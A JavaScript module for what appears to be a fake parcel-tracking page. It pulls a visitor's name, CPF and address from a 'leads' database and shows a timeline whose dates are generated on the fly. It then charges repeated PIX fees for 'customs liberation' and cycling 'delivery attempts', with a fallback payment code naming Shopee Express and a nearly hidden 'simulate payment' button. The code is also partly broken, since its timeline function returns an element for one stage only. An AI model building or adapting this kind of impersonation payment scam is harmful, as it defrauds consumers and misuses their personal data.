/**
 * Sistema de rastreamento baseado APENAS em dados do banco
 * SEM API DE CPF - APENAS DADOS DO SUPABASE
 */
import { DatabaseService } from '../services/database.js';
import { UIHelpers } from '../utils/ui-helpers.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { ZentraPayService } from '../services/zentra-pay.js';

export class TrackingSystem {
    constructor() {
        this.dbService = new DatabaseService();
        this.currentCPF = null;
        this.trackingData = null;
        this.leadData = null; // Dados do banco
        this.zentraPayService = new ZentraPayService();
        this.isInitialized = false;
        this.pixData = null;
        this.paymentErrorShown = false;
        this.paymentRetryCount = 0;
        this.deliveryValues = [7.74, 12.38, 16.46];
        this.deliveryAttempts = 0;
        this.deliveryPixData = null;
        
        console.log('TrackingSystem inicializado - DADOS DO BANCO');
        this.initWhenReady();
    }

    initWhenReady() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.init());
        } else {
            this.init();
        }
        
        // Fallbacks
        setTimeout(() => this.init(), 100);
        setTimeout(() => this.init(), 500);
        setTimeout(() => this.init(), 1000);
    }

    init() {
        if (this.isInitialized) return;
        
        console.log('Inicializando sistema de rastreamento baseado no banco...');
        
        try {
            this.setupEventListeners();
            this.handleAutoFocus();
            this.clearOldData();
            this.validateZentraPaySetup();
            this.isInitialized = true;
            console.log('Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('Erro na inicialização:', error);
            setTimeout(() => {
                this.isInitialized = false;
                this.init();
            }, 1000);
        }
    }

    validateZentraPaySetup() {
        if (this.zentraPayService.validateApiSecret()) {
            console.log('✅ API Zentra Pay configurada corretamente');
        } else {
            console.error('❌ Problema na configuração da API Zentra Pay');
        }
    }

    setupEventListeners() {
        console.log('Configurando event listeners...');
        this.setupFormSubmission();
        this.setupCPFInput();
        this.setupTrackButton();
        this.setupModalEvents();
        this.setupCopyButtons();
        this.setupAccordion();
        this.setupKeyboardEvents();
        console.log('Event listeners configurados');
    }

    setupFormSubmission() {
        const form = document.getElementById('trackingForm');
        if (form) {
            console.log('Form encontrado por ID');
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Form submetido via ID');
                this.handleTrackingSubmit();
            });
        }

        document.querySelectorAll('form').forEach((form, index) => {
            console.log(`Configurando form ${index}`);
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log(`Form ${index} submetido`);
                this.handleTrackingSubmit();
            });
        });
    }

    setupTrackButton() {
        console.log('Configurando botão de rastreamento...');
        
        const trackButton = document.getElementById('trackButton');
        if (trackButton) {
            console.log('Botão encontrado por ID: trackButton');
            this.configureTrackButton(trackButton);
        }

        document.querySelectorAll('.track-button').forEach((button, index) => {
            console.log(`Configurando botão por classe ${index}`);
            this.configureTrackButton(button);
        });

        document.querySelectorAll('button[type="submit"], button').forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                console.log(`Configurando botão por texto ${index}: ${button.textContent}`);
                this.configureTrackButton(button);
            }
        });

        document.addEventListener('click', (e) => {
            const target = e.target;
            if (target && target.tagName === 'BUTTON' && 
                target.textContent && target.textContent.toLowerCase().includes('rastrear')) {
                e.preventDefault();
                e.stopPropagation();
                console.log('Botão rastrear clicado via delegação');
                this.handleTrackingSubmit();
            }
        });
    }

    configureTrackButton(button) {
        const newButton = button.cloneNode(true);
        button.parentNode.replaceChild(newButton, button);
        
        newButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log('Botão rastrear clicado:', newButton.id || newButton.className);
            this.handleTrackingSubmit();
        });

        newButton.style.cursor = 'pointer';
        newButton.style.pointerEvents = 'auto';
        newButton.removeAttribute('disabled');
        
        if (newButton.type !== 'submit') {
            newButton.type = 'button';
        }
        
        console.log('Botão configurado:', newButton.id || newButton.className);
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.warn('Campo CPF não encontrado');
            return;
        }

        console.log('Configurando campo CPF...');
        
        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
            this.validateCPFInput();
        });

        cpfInput.addEventListener('keypress', (e) => {
            this.preventNonNumeric(e);
        });

        cpfInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });

        cpfInput.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const cleanText = pastedText.replace(/[^\d]/g, '');
            if (cleanText.length <= 11) {
                cpfInput.value = cleanText;
                CPFValidator.applyCPFMask(cpfInput);
                this.validateCPFInput();
            }
        });

        cpfInput.addEventListener('focus', () => {
            cpfInput.setAttribute('inputmode', 'numeric');
        });

        console.log('Campo CPF configurado');
    }

    preventNonNumeric(e) {
        const allowedKeys = [8, 9, 27, 13, 46, 35, 36, 37, 38, 39, 40];
        if (allowedKeys.includes(e.keyCode) ||
            (e.keyCode === 65 && e.ctrlKey) ||
            (e.keyCode === 67 && e.ctrlKey) ||
            (e.keyCode === 86 && e.ctrlKey) ||
            (e.keyCode === 88 && e.ctrlKey)) {
            return;
        }
        
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && 
            (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    }

    validateCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        
        if (!cpfInput) return;

        const cleanCPF = CPFValidator.cleanCPF(cpfInput.value);
        
        trackButtons.forEach(button => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                if (cleanCPF.length === 11) {
                    button.disabled = false;
                    button.style.opacity = '1';
                    button.style.cursor = 'pointer';
                    cpfInput.style.borderColor = '#27ae60';
                } else {
                    button.disabled = true;
                    button.style.opacity = '0.7';
                    button.style.cursor = 'not-allowed';
                    cpfInput.style.borderColor = cleanCPF.length > 0 ? '#e74c3c' : '#e9ecef';
                }
            }
        });
    }

    async handleTrackingSubmit() {
        console.log('=== INICIANDO BUSCA APENAS NO BANCO ===');
        
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.error('Campo CPF não encontrado');
            this.showError('Campo CPF não encontrado. Recarregue a página.');
            return;
        }

        const cpfValue = cpfInput.value;
        const cleanCPF = CPFValidator.cleanCPF(cpfValue);
        
        console.log('CPF digitado:', cpfValue);
        console.log('CPF limpo:', cleanCPF);

        if (!CPFValidator.isValidCPF(cpfValue)) {
            console.log('CPF inválido');
            this.showError('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        console.log('CPF válido, buscando APENAS no banco...');
        this.showLoadingNotification();

        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        const originalTexts = [];
        
        trackButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                originalTexts[index] = button.innerHTML;
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
                button.disabled = true;
            }
        });

        try {
            // Aguardar um pouco para mostrar o loading
            await new Promise(resolve => setTimeout(resolve, 1500));

            console.log('🔍 Buscando no banco de dados...');
            
            // Buscar no banco de dados
            const dbResult = await this.getLeadFromLocalStorage(cleanCPF);
            
            if (dbResult.success && dbResult.data) {
                console.log('✅ LEAD ENCONTRADO NO BANCO!');
                console.log('📦 Dados do lead:', dbResult.data);
                
                this.leadData = dbResult.data;
                this.currentCPF = cleanCPF;
                
                this.closeLoadingNotification();
                
                console.log('📋 Exibindo dados do banco...');
                this.displayOrderDetailsFromDatabase();
                this.generateRealTrackingData();
                this.displayTrackingResults();
                this.saveTrackingData();
                
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    this.scrollToElement(orderDetails, 100);
                }
                
                // Destacar botão de liberação se necessário
                setTimeout(() => {
                    this.highlightLiberationButton();
                }, 1000);
                
            } else {
                console.log('❌ CPF não encontrado no banco');
                this.closeLoadingNotification();
                this.showError('CPF inexistente. Não encontramos sua encomenda.');
                
                // Mostrar pop-up discreta após 2 segundos
                setTimeout(() => {
                    this.showDiscreteHelpPopup();
                }, 2000);
            }
            
        } catch (error) {
            console.error('Erro no processo:', error);
            this.closeLoadingNotification();
            this.showError('Erro ao consultar CPF. Tente novamente.');
        } finally {
            trackButtons.forEach((button, index) => {
                if (button.textContent && originalTexts[index]) {
                    button.innerHTML = originalTexts[index];
                    button.disabled = false;
                }
            });
            this.validateCPFInput();
        }
    }

    async getLeadFromLocalStorage(cpf) {
        return await this.dbService.getLeadByCPF(cpf);
    }

    displayOrderDetailsFromDatabase() {
        if (!this.leadData) return;

        console.log('📋 Exibindo dados do banco de dados');
        
        const customerName = this.getFirstAndLastName(this.leadData.nome_completo || 'Nome não informado');
        const formattedCPF = CPFValidator.formatCPF(this.leadData.cpf || '');
        
        // Dados básicos
        this.updateElement('customerName', customerName);
        this.updateElement('fullName', this.leadData.nome_completo || 'Nome não informado');
        this.updateElement('formattedCpf', formattedCPF);
        this.updateElement('customerNameStatus', customerName);
        
        // Produto
        let productName = 'Produto não informado';
        if (this.leadData.produtos && this.leadData.produtos.length > 0) {
            productName = this.leadData.produtos[0].nome || 'Produto não informado';
        }
        this.updateElement('customerProduct', productName);
        
        // Endereço completo formatado
        const fullAddress = this.leadData.endereco || 'Endereço não informado';
        this.updateElement('customerFullAddress', fullAddress);
        
        console.log('✅ Interface atualizada com dados do banco');
        console.log('👤 Nome exibido:', customerName);
        console.log('📄 Nome completo:', this.leadData.nome_completo);
        console.log('📍 Endereço:', fullAddress);
        console.log('📦 Produto:', productName);
        
        this.showElement('orderDetails');
        this.showElement('trackingResults');
    }

    generateRealTrackingData() {
        console.log('📦 Gerando dados de rastreamento reais do banco');
        
        if (!this.leadData) return;
        
        const currentStage = this.leadData.etapa_atual || 1;
        const stageNames = this.getStageNames();
        
        this.trackingData = {
            cpf: this.leadData.cpf,
            currentStep: currentStage,
            steps: [],
            liberationPaid: this.leadData.status_pagamento === 'pago',
            liberationDate: this.leadData.status_pagamento === 'pago' ? new Date().toISOString() : null,
            deliveryAttempts: 0,
            lastUpdate: this.leadData.updated_at || new Date().toISOString()
        };

        // Gerar etapas baseadas na etapa atual do banco
        for (let i = 1; i <= Math.max(currentStage, 11); i++) {
            const stepDate = new Date();
            stepDate.setHours(stepDate.getHours() - (Math.max(currentStage, 11) - i));
            
            this.trackingData.steps.push({
                id: i,
                date: stepDate,
                title: stageNames[i] || `Etapa ${i}`,
                description: stageNames[i] || `Etapa ${i}`,
                isChina: i >= 3 && i <= 7,
                completed: i <= currentStage,
                needsLiberation: i === 11 && this.leadData.status_pagamento !== 'pago'
            });
        }
        
        console.log('✅ Dados de rastreamento gerados baseados no banco');
        console.log('📊 Etapa atual:', currentStage);
        console.log('💳 Status pagamento:', this.leadData.status_pagamento);
    }

    getStageNames() {
        return {
            1: 'Seu pedido foi criado',
            2: 'O seu pedido está sendo preparado para envio',
            3: '[China] O vendedor enviou seu pedido',
            4: '[China] O pedido chegou ao centro de triagem de Shenzhen',
            5: '[China] Pedido saiu do centro logístico de Shenzhen',
            6: '[China] Coletado. O pedido está em trânsito internacional',
            7: '[China] O pedido foi liberado na alfândega de exportação',
            8: 'Pedido saiu da origem: Shenzhen',
            9: 'Pedido chegou no Brasil',
            10: 'Pedido em trânsito para CURITIBA/PR',
            11: 'Pedido chegou na alfândega de importação: CURITIBA/PR',
            12: 'Pedido liberado na alfândega de importação',
            13: 'Pedido sairá para entrega',
            14: 'Pedido em trânsito entrega',
            15: 'Pedido em rota de entrega',
            16: 'Tentativa entrega'
        };
    }

    displayTrackingResults() {
        this.updateStatus();
        this.renderTimeline();
        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 500);
    }

    updateStatus() {
        const statusIcon = document.getElementById('statusIcon');
        const currentStatus = document.getElementById('currentStatus');
        
        if (!statusIcon || !currentStatus) return;
        
        // Obter texto exato da etapa atual do banco de dados
        let stageText = '';
        if (this.leadData && this.leadData.etapa_atual) {
            // Usar o texto exato da etapa como está no banco
            const stageNames = this.getStageNames();
            stageText = stageNames[this.leadData.etapa_atual] || `Etapa ${this.leadData.etapa_atual}`;
        } else {
            stageText = 'Pedido chegou na alfândega de importação: CURITIBA/PR';
        }
        
        // Atualizar ícone baseado na etapa atual
        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;
        
        if (currentStage >= 17) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else if (currentStage >= 13) {
            statusIcon.innerHTML = '<i class="fas fa-truck"></i>';
            statusIcon.className = 'status-icon in-delivery';
        } else if (currentStage >= 12) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else {
            statusIcon.innerHTML = '<i class="fas fa-clock"></i>';
            statusIcon.className = 'status-icon in-transit';
        }
        
        // Exibir apenas o texto exato da etapa atual
        currentStatus.textContent = stageText;
    }

    renderTimeline() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        timeline.innerHTML = '';
        const currentStage = this.leadData ? parseInt(this.leadData.etapa_atual) : 11;
        
        this.trackingData.steps.forEach((step, index) => {
            // Mostrar apenas etapas até a etapa atual
            if (step.id <= Math.max(currentStage, 11)) {
                const isLast = step.id === currentStage;
                const timelineItem = this.createTimelineItem(step, isLast);
                timeline.appendChild(timelineItem);
            }
        });
    }

    createTimelineItem(step, isLast) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''} ${isLast ? 'last' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';
        
        const dateStr = step.date instanceof Date ? 
            step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' }) :
            step.date;
        const currentStage = this.leadData ? parseInt(this.leadData.etapa_atual) : 11;
        
        // Botão de liberação alfandegária (etapa 11)
        let buttonHtml = '';
        if (step.id === 11 && currentStage <= 12 && this.leadData?.status_pagamento !== 'pago') {
            buttonHtml = `
                <button class="liberation-button-timeline" data-step-id="${step.id}">
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `;
        }
        
        // Botões de tentativas de entrega (etapas 17, 21, 25, 29...)
        if (this.isDeliveryAttemptStage(step.id) && step.id === currentStage) {
            const attemptNumber = this.getAttemptNumber(step.id);
            const attemptValue = this.getAttemptValue(attemptNumber);
            
            buttonHtml = `
                <button class="delivery-button-timeline" data-step-id="${step.id}" data-attempt="${attemptNumber}" data-value="${attemptValue}">
                    <i class="fas fa-truck"></i> LIBERAR ENTREGA
                </button>
            `;
        }
        
        // Botão para Alfândega de Importação (etapa 11)
        if (step.id === 11 && step.completed) {
            const timeStr = step.date instanceof Date ?
                step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }) :
                step.time || '00:00';
        
            let buttonHtml = '';
        
            // Botão de liberação alfandegária
            if (step.needsLiberation && step.completed) {
                buttonHtml = `
                    <button class="liberation-button-timeline" data-step-id="${step.id}">
                        <i class="fas fa-unlock"></i> LIBERAR OBJETO
                    </button>
                `;
            }
        
            // Botão para Tentativas de Entrega (etapas 17, 21, 25, 29...)
            if (step.id >= 17 && (step.id - 17) % 4 === 0 && step.completed) {
                const attemptNumber = Math.floor((step.id - 17) / 4) + 1;
                const deliveryValues = [9.74, 14.98, 18.96];
                const value = deliveryValues[(attemptNumber - 1) % deliveryValues.length];
            
                buttonHtml = `
                    <button class="delivery-button-timeline" data-step-id="${step.id}" data-attempt="${attemptNumber}" data-value="${value}">
                        <i class="fas fa-truck"></i> LIBERAR ENTREGA
                    </button>
                `;
            }
        
            // Botão para tentativas de entrega
            if (step.isDeliveryAttempt && step.deliveryValue && step.attemptNumber) {
                const buttonText = step.attemptNumber === 1 ? 'LIBERAR ENTREGA' : 'REENVIAR PACOTE';
                const buttonIcon = step.attemptNumber === 1 ? 'fas fa-unlock' : 'fas fa-redo';
            
                buttonHtml = `
                    <button class="delivery-attempt-button" 
                            data-attempt="${step.attemptNumber}" 
                            data-value="${step.deliveryValue}"
                            style="
                                background: linear-gradient(45deg, #e74c3c, #c0392b);
                                color: white;
                                border: none;
                                padding: 12px 25px;
                                font-size: 1rem;
                                font-weight: 700;
                                border-radius: 25px;
                                cursor: pointer;
                                transition: all 0.3s ease;
                                box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
                                animation: pulse 2s infinite;
                                font-family: 'Roboto', sans-serif;
                                letter-spacing: 0.5px;
                                margin-top: 15px;
                                display: inline-flex;
                                align-items: center;
                                gap: 8px;
                            ">
                        <i class="${buttonIcon}"></i> ${buttonText}
                    </button>
                `;
            }
        
            // Botão de tentativa de entrega
            if (step.hasDeliveryButton && step.completed) {
                const attemptNumber = this.getDeliveryAttemptNumber(step.id);
                const deliveryValue = this.getDeliveryValue(attemptNumber);
            
                buttonHtml = `
                    <button class="liberation-button-timeline delivery-attempt-button" 
                            data-step-id="${step.id}" 
                            data-attempt="${attemptNumber}"
                            data-value="${deliveryValue}">
                        <i class="fas fa-truck"></i> LIBERAR ENTREGA
                    </button>
                `;
            }
        
            item.innerHTML = `
                <div class="timeline-dot"></div>
                <div class="timeline-content">
                    <div class="timeline-date">
                        <span class="date">${dateStr}</span>
                        <span class="time">${timeStr}</span>
                    </div>
                    <div class="timeline-text">
                        <p>${step.isChina ? '<span class="china-tag">[China]</span>' : ''}${step.description}</p>
                        ${buttonHtml}
                    </div>
                </div>
            `;
        
            // Configurar eventos dos botões
            if (step.id === 11 && step.completed) {
                const liberationButton = item.querySelector('.liberation-button-timeline');
                if (liberationButton && !liberationButton.classList.contains('delivery-attempt-button')) {
                    liberationButton.addEventListener('click', () => {
                        this.openLiberationModal();
                    });
                }
            }
        
            if (step.id >= 17 && (step.id - 17) % 4 === 0 && step.completed) {
                const deliveryButton = item.querySelector('.delivery-button-timeline');
                if (deliveryButton) {
                    deliveryButton.addEventListener('click', () => {
                        const attemptNumber = parseInt(deliveryButton.dataset.attempt);
                        const value = parseFloat(deliveryButton.dataset.value);
                        this.openDeliveryModal(attemptNumber, value);
                    });
                }
            }
        
            // Configurar eventos para botões de tentativa de entrega
            if (step.isDeliveryAttempt && step.deliveryValue && step.attemptNumber) {
                const deliveryButton = item.querySelector('.delivery-attempt-button');
                if (deliveryButton) {
                    deliveryButton.addEventListener('click', () => {
                        this.handleDeliveryAttemptPayment(step.attemptNumber, step.deliveryValue);
                    });
                }
            }
        
            if (step.hasDeliveryButton && step.completed) {
                const deliveryButton = item.querySelector('.delivery-attempt-button');
                if (deliveryButton) {
                    deliveryButton.addEventListener('click', () => {
                        const attemptNumber = parseInt(deliveryButton.dataset.attempt);
                        const value = parseFloat(deliveryButton.dataset.value);
                        this.openDeliveryModal(attemptNumber, value, deliveryButton);
                    });
                }
            }
        
            return item;
        }
    }

    getDeliveryAttemptNumber(stageId) {
        const attemptMap = {
            16: 1,   // 1ª tentativa
            106: 2,  // 2ª tentativa  
            116: 3,  // 3ª tentativa
            126: 1   // Volta para 1ª (ciclo)
        };
        return attemptMap[stageId] || 1;
    }

    getDeliveryValue(attemptNumber) {
        const values = [7.74, 12.38, 16.46];
        return values[attemptNumber - 1] || 7.74;
    }

    // Lidar com pagamento de tentativa de entrega
    async handleDeliveryAttemptPayment(attemptNumber, value) {
        console.log(`💳 Processando pagamento da ${attemptNumber}ª tentativa - R$ ${value.toFixed(2)}`);
        
        // Mostrar loading
        this.showDeliveryPaymentLoading(attemptNumber);
        
        try {
            // Gerar PIX via Zentra Pay
            const userData = {
                nome: this.leadData.nome_completo,
                cpf: this.leadData.cpf,
                email: this.leadData.email,
                telefone: this.leadData.telefone
            };
            
            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);
            
            if (pixResult.success) {
                console.log('🎉 PIX de entrega gerado com sucesso!');
                this.deliveryPixData = pixResult;
                
                this.closeDeliveryPaymentLoading();
                
                // Mostrar modal de pagamento
                setTimeout(() => {
                    this.showDeliveryPaymentModal(attemptNumber, value);
                }, 300);
            } else {
                throw new Error(pixResult.error || 'Erro ao gerar PIX');
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX de entrega:', error);
            this.closeDeliveryPaymentLoading();
            
            // Mostrar modal estático como fallback
            setTimeout(() => {
                this.showDeliveryPaymentModal(attemptNumber, value, true);
            }, 300);
        }
    }

    // Mostrar loading para pagamento de entrega
    showDeliveryPaymentLoading(attemptNumber) {
        const loading = document.createElement('div');
        loading.id = 'deliveryPaymentLoading';
        loading.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const content = document.createElement('div');
        content.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #e74c3c;
        `;

        content.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #e74c3c; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Gerando PIX de Entrega...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Processando ${attemptNumber}ª tentativa de entrega
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #e74c3c, #c0392b); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
        `;

        loading.appendChild(content);
        document.body.appendChild(loading);
        document.body.style.overflow = 'hidden';
    }

    // Fechar loading de pagamento de entrega
    closeDeliveryPaymentLoading() {
        const loading = document.getElementById('deliveryPaymentLoading');
        if (loading) {
            loading.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (loading.parentNode) {
                    loading.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    // Mostrar modal de pagamento de entrega
    showDeliveryPaymentModal(attemptNumber, value, isStatic = false) {
        const modal = document.createElement('div');
        modal.className = 'modal-overlay';
        modal.id = 'deliveryPaymentModal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        // QR Code e PIX Payload
        let qrCodeSrc, pixPayload;
        
        if (!isStatic && this.deliveryPixData && this.deliveryPixData.pixPayload) {
            qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`;
            pixPayload = this.deliveryPixData.pixPayload;
            console.log('✅ Usando PIX real do Zentra Pay para entrega');
        } else {
            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            console.log('⚠️ Usando PIX estático como fallback para entrega');
        }

        const buttonText = attemptNumber === 1 ? 'Liberar Entrega' : `${attemptNumber}ª Tentativa de Reenvio`;

        modal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">${buttonText}</h2>
                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para ${attemptNumber === 1 ? 'liberar a entrega' : 'reagendar a entrega'} do seu pedido, é necessário pagar a taxa de R$ ${value.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de ${attemptNumber === 1 ? 'Liberação de' : 'Reenvio -'} Entrega</span>
                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${qrCodeSrc}" alt="QR Code PIX Entrega" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar Chave PIX
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Botão de Simulação -->
                        <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
                            <button id="simulateDeliveryPaymentButton" data-attempt="${attemptNumber}" style="
                                background: transparent;
                                color: #666;
                                border: 1px solid #ddd;
                                padding: 6px 12px;
                                border-radius: 6px;
                                cursor: pointer;
                                font-weight: 600;
                                transition: all 0.3s ease;
                                opacity: 0.7;
                                font-size: 12px;
                                min-width: 30px;
                                height: 28px;
                            ">
                                --
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';

        // Configurar eventos
        this.setupDeliveryPaymentModalEvents(modal, attemptNumber, value);

        console.log(`💳 Modal de pagamento da ${attemptNumber}ª tentativa exibido - R$ ${value.toFixed(2)}`);
    }

    // Configurar eventos do modal de pagamento de entrega
    setupDeliveryPaymentModalEvents(modal, attemptNumber, value) {
        // Botão fechar
        const closeButton = modal.querySelector('#closeDeliveryPaymentModal');
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeDeliveryPaymentModal();
            });
        }

        // Botão copiar PIX
        const copyButton = modal.querySelector('#copyDeliveryPixButton');
        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyDeliveryPixCode();
            });
        }

        // Botão simular pagamento
        const simulateButton = modal.querySelector('#simulateDeliveryPaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulateDeliveryPayment(attemptNumber);
            });
        }

        // Fechar ao clicar fora
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeDeliveryPaymentModal();
            }
        });
    }

    // Copiar código PIX de entrega
    copyDeliveryPixCode() {
        const pixInput = document.getElementById('deliveryPixCode');
        const copyButton = document.getElementById('copyDeliveryPixButton');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX de entrega copiado');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX de entrega:', error);
        }
    }

    // Simular pagamento de entrega
    simulateDeliveryPayment(attemptNumber) {
        console.log(`✅ Simulando pagamento da ${attemptNumber}ª tentativa`);
        
        // Fechar modal
        this.closeDeliveryPaymentModal();
        
        // Processar pagamento com sucesso
        setTimeout(() => {
            this.processDeliveryPaymentSuccess(attemptNumber);
        }, 1000);
    }

    // Processar sucesso do pagamento de entrega
    processDeliveryPaymentSuccess(attemptNumber) {
        console.log(`🎉 Pagamento da ${attemptNumber}ª tentativa confirmado!`);
        
        // Ocultar botão atual
        const currentButton = document.querySelector(`[data-attempt="${attemptNumber}"]`);
        if (currentButton) {
            currentButton.style.display = 'none';
        }
        
        // Mostrar notificação de sucesso
        this.showDeliverySuccessNotification(attemptNumber);
        
        // Iniciar fluxo de entrega
        setTimeout(() => {
            this.startDeliveryFlow(attemptNumber);
        }, 2000);
    }

    // Mostrar notificação de sucesso da entrega
    showDeliverySuccessNotification(attemptNumber) {
        const notification = document.createElement('div');
        notification.className = 'delivery-success-notification';
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
